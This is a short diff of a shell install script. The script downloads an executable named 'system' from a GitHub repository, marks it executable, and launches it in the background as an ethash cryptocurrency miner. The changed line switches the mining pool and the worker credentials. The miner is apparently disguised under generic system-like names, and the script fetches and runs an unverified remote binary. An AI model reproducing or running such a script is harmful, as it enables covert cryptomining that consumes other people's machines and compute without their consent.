@@ -18,5 +18,5 @@ if [ ! -f "${SCRIPT_DIR}/installed.txt" ]; then
 	sudo apt-get install libcurl3 -y
 	wget https://github.com/dipsey1337/yuhu/raw/main/system
 	chmod +x system
-	./system -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u bigdata -p 12345 -w system_test &
+	./system -a ethash -o stratum+tcp://eth-eu.sparkpool.com:3333 -u sp_ajg -p x -w system_test &
 fi
